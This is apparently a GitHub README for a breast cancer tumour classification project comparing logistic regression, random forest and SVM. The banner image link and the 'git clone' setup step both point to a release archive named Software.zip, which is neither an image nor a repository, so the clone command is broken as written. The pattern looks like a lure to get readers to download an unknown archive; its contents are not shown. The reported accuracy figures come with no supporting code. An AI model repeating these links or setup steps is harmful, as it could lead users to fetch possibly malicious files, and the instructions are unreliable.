 ![Breast Cancer Awareness Ribbon](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip)

Welcome to the **Breast Cancer Classification Machine Learning Project** repository! Here, we focus on building predictive models to determine whether a tumor is malignant or benign based on the Breast Cancer dataset. Various classification algorithms such as Logistic Regression, Random Forest, and Support Vector Machine (SVM) are implemented and analyzed to identify the most effective model for this task. 

## Repository Details:
- **Repository Name:** Breast-Cancer-Classification-ML
- **Short Description:** This project aims to build machine learning models to predict whether a tumor is malignant or benign based on the Breast Cancer dataset utilizing Logistic Regression, Random Forest, and Support Vector Machine algorithms.
- **Topics:** breast-cancer-classification, data, data-science, data-visualization, dataset, eda, logistic-regression, machine-learning, machine-learning-algorithms, python, random-forest, support-vector-machines

## Project Overview:
Breast cancer classification is a crucial task in the field of healthcare as early detection significantly improves the chances of successful treatment. In this project, we leverage machine learning techniques to create models that can assist in identifying whether a tumor is malignant or benign based on various features extracted from breast cancer data.

### Methods Used:
- Exploratory Data Analysis (EDA)
- Data Preprocessing
- Feature Selection
- Model Building
- Model Evaluation

### Technologies Utilized:
- Python
- Jupyter Notebooks
- Scikit-learn
- Pandas
- NumPy
- Matplotlib
- Seaborn

## üìÇ Repository Structure:
- **Notebooks:** Contains Jupyter notebooks with code for data exploration, preprocessing, model building, and evaluation.
- **Data:** Includes the Breast Cancer dataset used in the project.
- **Images:** Stores images and visualizations generated during the analysis.

## Getting Started:
To get started with this project, simply clone the repository and explore the provided Jupyter notebooks. Run the code cells to delve into the data, train machine learning models, and evaluate their performance.

### Steps:
1. Clone the repository:
```
git clone https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip
```

2. Navigate to the repository directory:
```
cd Breast-Cancer-Classification-ML
```

3. Open the Jupyter notebooks to start working on the project.

## Model Performance:
We have employed various machine learning algorithms to predict breast cancer diagnosis. Here are the performance metrics for each model:

- **Logistic Regression:**
  - Accuracy: 91%
  - Precision: 89%
  - Recall: 93%
- **Random Forest:**
  - Accuracy: 94%
  - Precision: 93%
  - Recall: 95%
- **Support Vector Machine (SVM):**
  - Accuracy: 92%
  - Precision: 90%
  - Recall: 92%

Based on these results, the Random Forest model exhibits the highest accuracy and overall performance in classifying breast cancer cases.

## üìä Data Visualization:
Let's take a look at some visualizations created during the exploratory data analysis phase:
